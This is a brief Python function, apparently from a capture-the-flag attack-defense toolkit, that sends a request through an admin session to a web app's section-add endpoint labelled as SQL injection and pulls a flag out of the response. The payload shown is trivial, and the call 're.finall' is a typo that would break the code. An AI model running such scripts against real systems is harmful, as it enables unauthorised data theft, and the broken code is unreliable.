import re
def sqli(host):
    global sess_admin
    data={"section_name":"asd?"}
    r=sess_admin.post('http://%s/index.php/section/add'%host,data=data)
    flags=re.finall(r'~(.+?)~',r.content)
    if flags:
        return flags[0]
    else:
        return "error pwn!"